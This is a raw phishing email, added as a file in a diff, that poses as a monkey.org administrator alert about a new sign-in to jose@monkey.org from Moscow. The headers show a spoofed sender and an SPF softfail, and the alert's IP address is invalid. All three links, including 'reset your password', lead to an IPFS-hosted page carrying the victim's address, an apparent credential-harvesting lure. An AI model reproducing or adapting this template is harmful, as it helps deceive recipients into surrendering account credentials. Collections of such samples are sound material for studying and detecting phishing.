@@ -1,0 +1,189 @@
+Return-Path: jose@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 81308820180.27.BCEFE71
+Received: from a-match.info (a-match.info [106.75.66.173])
+	by imf06.b.hostedemail.com (Postfix) with ESMTP id 3B85FC000A
+	for <jose@monkey.org>; Wed,  4 Oct 2023 19:50:08 +0000 (UTC)
+Authentication-Results: imf06.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf06.b.hostedemail.com: 106.75.66.173 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1696449009;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=UTza3sqisqofnR95SDktDGGAhsSWixryEFkhx0h1LnQ=;
+	b=qmzr5B7eArkVjjYure6je08qGA8aie4jcQ/+0QkxmB+Nn9qOpjJYHAmwLawsqAvfqjGvzX
+	RXHJBpmRqOvj11OKl1bLTO8WPwqi3Qz+Cyl/4VrTwVBob/5eA59UExWU1pq0rpLvk/glTy
+	f/o/MaZFBJYy3niIORtgntO9H6aCEb4=
+ARC-Authentication-Results: i=1;
+	imf06.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf06.b.hostedemail.com: 106.75.66.173 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1696449009; a=rsa-sha256;
+	cv=none;
+	b=7A1EfqdE5pt/Qf+BEvwGKZ5VhdnehXRxpaXxR+8HTQ2WMkw/wr6mjuqGTafhY/amgXbmQi
+	Uqohwn+vH/RBrQHZ6YiAYabCKwshA8rSxsy3zbSTDzgRmVX23ggu1Yk4+eyFl6wj70CKi1
+	xHTMuHhOsJoQhRBL1ya4YufGtDdWsZ4=
+From: monkey.org Admin < jose@monkey.org >
+To: jose@monkey.org
+Subject: New device has logged in to your monkey.org account
+Date: 04 Oct 2023 12:50:04 -0700
+Message-ID: <20231004125004.45B5E47B406B7B00@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 3B85FC000A
+X-Stat-Signature: bdn11mhzi5tbfzhweyo1seaz78f4buyd
+X-Rspam-User: 
+X-Spam-Status: No, score=8.60
+X-Rspamd-Server: rspam05
+X-HE-Tag: 1696449008-794967
+X-HE-Meta: U2FsdGVkX1+LFslgquunZXu63mcPh/csxstS3O7E8iAtJIDHTxDFtT+Wwr0+dgpw6gA3tcNgHTOemTF8MuT7uFne2w+pvUgbYZsKs28w3dWr28QkLc2H1cWwVbP6Apc+KminmOAVV/zg4lGo+MF5viR9b2wLQMr58bgS9deFVC84QXk2aC99RJdClYvz3XqhWC5h+DlDLl0LSdCed3qiEJV+l+lp4QVQZTy+QpmnjRg=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 302
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY style=3D"MARGIN: 0.5em">
+<TABLE style=3D'FONT-SIZE: 14px; FONT-FAMILY: "Segoe UI", Tahoma; WIDTH: 81=
+1px; VERTICAL-ALIGN: top; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-CO=
+LLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0)=
+; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: =
+0px; BORDER-SPACING: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PA=
+DDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial'>
+<TBODY>
+<TR style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dleft>
+<TH style=3D"FONT-SIZE: 16px; FONT-FAMILY: Arial, Helvetica, sans-serif; WI=
+DTH: 520px; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; COLOR: rgb(91,97,1=
+06); PADDING-BOTTOM: 16px; PADDING-TOP: 0px; PADDING-LEFT: 60px; MARGIN: 0p=
+x auto; LINE-HEIGHT: 1.5; PADDING-RIGHT: 60px" vAlign=3Dtop align=3Dleft>
+<TABLE style=3D"WIDTH: 691px; VERTICAL-ALIGN: top; BORDER-COLLAPSE: collaps=
+e; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-SPACING=
+: 0px; PADDING-RIGHT: 0px">
+<TBODY>
+<TR style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dleft>
+<TH style=3D"BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; PADDING-BOTTOM: 0=
+px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.5; PAD=
+DING-RIGHT: 0px" vAlign=3Dtop align=3Dleft>
+<H4 style=3D"FONT-SIZE: 24px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0p=
+x; PADDING-LEFT: 0px; MARGIN: 0px 0px 16px; LINE-HEIGHT: 1.5; PADDING-RIGHT=
+: 0px" align=3Dleft>New sign-in with your Mail account</H4>
+<TABLE style=3D"WIDTH: 691px; VERTICAL-ALIGN: top; BORDER-COLLAPSE: collaps=
+e; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-SPACING=
+: 0px; PADDING-RIGHT: 0px">
+<TBODY>
+<TR style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dleft>
+<TD style=3D"FONT-SIZE: 10px; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0p=
+x; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 10px; PAD=
+DING-RIGHT: 0px" height=3D10 vAlign=3Dtop align=3Dleft>&nbsp;</TD></TR></TB=
+ODY></TABLE>
+<TABLE style=3D"WIDTH: 691px; VERTICAL-ALIGN: top; BORDER-COLLAPSE: collaps=
+e; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-SPACING=
+: 0px; MARGIN: 10px auto; PADDING-RIGHT: 0px">
+<TBODY>
+<TR style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dleft>
+<TH style=3D"BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; MARGIN: 0px; LINE=
+-HEIGHT: 1.5" vAlign=3Dtop align=3Dcenter>&nbsp;&nbsp;&nbsp;</TH></TR></TBO=
+DY></TABLE>
+<P style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGI=
+N: 0px 0px 10px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px" align=3Dleft></P>
+<P style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGI=
+N: 0px 0px 10px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px" align=3Dleft>Your&nb=
+sp;Mail account jose@monkey.org was just used to sign in on a new device.</=
+P><BR>
+<P style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGI=
+N: 0px 0px 10px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px" align=3Dleft><STRONG=
+>10/4/2023 12:50:04 p.m. Central Time<BR>From 719.78.69.72.66</STRONG><STRO=
+NG>(IP address potentially located in Moscow, Russia)</STRONG></P>
+<P style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGI=
+N: 0px 0px 10px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px" align=3Dleft>
+If you did not make this change,&nbsp;<A style=3D"COLOR: rgb(0,113,187); PA=
+DDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 1.5; P=
+ADDING-RIGHT: 0px; text-decoration-line: none" href=3D"https://ipfs.io/ipfs=
+/bafybeieu7ozmruwreuxj356mymbzmive7kaabvgn5rgy4psncbod4gidse/vbsvdbeggrgrfb=
+gmvmvkbkbomsmanasvvefr.html#jose@monkey.org" target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://shorturl.at/=
+flsBM%23uniontop@uniontop.com&amp;source=3Dgmail&amp;ust=3D1696480733801000=
+&amp;usg=3DAOvVaw3dO1f98W1yRSmD2aty6VmJ">reset your password</A>. For more =
+help, please visit the&nbsp;<FONT color=3D#0071bb>
+<A style=3D"COLOR: rgb(17,85,204); text-decoration-line: none" href=3D"http=
+s://ipfs.io/ipfs/bafybeieu7ozmruwreuxj356mymbzmive7kaabvgn5rgy4psncbod4gids=
+e/vbsvdbeggrgrfbgmvmvkbkbomsmanasvvefr.html#jose@monkey.org" target=3D_blan=
+k data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://shorturl.a=
+t/flsBM%23uniontop@uniontop.com&amp;source=3Dgmail&amp;ust=3D16964807338010=
+00&amp;usg=3DAOvVaw3dO1f98W1yRSmD2aty6VmJ">Mail Account Activity</A>&nbsp;<=
+FONT color=3D#5b616a>or</FONT>
+&nbsp;<A style=3D"COLOR: rgb(17,85,204); text-decoration-line: none" href=
+=3D"https://ipfs.io/ipfs/bafybeieu7ozmruwreuxj356mymbzmive7kaabvgn5rgy4psnc=
+bod4gidse/vbsvdbeggrgrfbgmvmvkbkbomsmanasvvefr.html#jose@monkey.org" target=
+=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://sh=
+orturl.at/flsBM%23uniontop@uniontop.com&amp;source=3Dgmail&amp;ust=3D169648=
+0733801000&amp;usg=3DAOvVaw3dO1f98W1yRSmD2aty6VmJ">Help Center</A></FONT>.<=
+/P>
+<TABLE style=3D"WIDTH: 691px; VERTICAL-ALIGN: top; BORDER-COLLAPSE: collaps=
+e; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-SPACING=
+: 0px; PADDING-RIGHT: 0px">
+<TBODY>
+<TR style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dleft>
+<TD style=3D"FONT-SIZE: 30px; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0p=
+x; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 30px; PAD=
+DING-RIGHT: 0px" height=3D30 vAlign=3Dtop align=3Dleft>&nbsp;</TD></TR></TB=
+ODY></TABLE></TH></TR></TBODY></TABLE></TH></TR></TBODY></TABLE>
+<TABLE style=3D'FONT-SIZE: 14px; FONT-FAMILY: "Segoe UI", Tahoma; WIDTH: 81=
+1px; VERTICAL-ALIGN: top; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-CO=
+LLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0)=
+; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: =
+0px; BORDER-SPACING: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PA=
+DDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial' align=3Dcenter>
+<TBODY>
+<TR style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dleft>
+<TD style=3D"FONT-SIZE: 16px; FONT-FAMILY: Arial, Helvetica, sans-serif; BO=
+RDER-COLLAPSE: collapse; COLOR: rgb(91,97,106); PADDING-BOTTOM: 0px; PADDIN=
+G-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.5; PADDING-RIGHT=
+: 0px" vAlign=3Dtop align=3Dleft>
+<TABLE style=3D"WIDTH: 811px; VERTICAL-ALIGN: top; BORDER-COLLAPSE: collaps=
+e; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-SPACING=
+: 0px; PADDING-RIGHT: 0px">
+<TBODY>
+<TR style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dleft>
+<TH style=3D"WIDTH: 520px; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; PAD=
+DING-BOTTOM: 16px; PADDING-TOP: 0px; PADDING-LEFT: 60px; MARGIN: 0px auto; =
+LINE-HEIGHT: 1.5; PADDING-RIGHT: 60px" vAlign=3Dtop align=3Dleft>
+<TABLE style=3D"WIDTH: 691px; VERTICAL-ALIGN: top; BORDER-COLLAPSE: collaps=
+e; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-SPACING=
+: 0px; PADDING-RIGHT: 0px">
+<TBODY>
+<TR style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dleft>
+<TH style=3D"BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; PADDING-BOTTOM: 0=
+px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.5; PAD=
+DING-RIGHT: 0px" vAlign=3Dtop align=3Dleft>
+<P style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGI=
+N: 0px 0px 10px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px" align=3Dleft>Please =
+do not reply to this message.</P></TH></TR></TBODY></TABLE></TH></TR></TBOD=
+Y></TABLE></TD></TR></TBODY></TABLE>
+<P>&nbsp;</P></BODY></HTML>
+
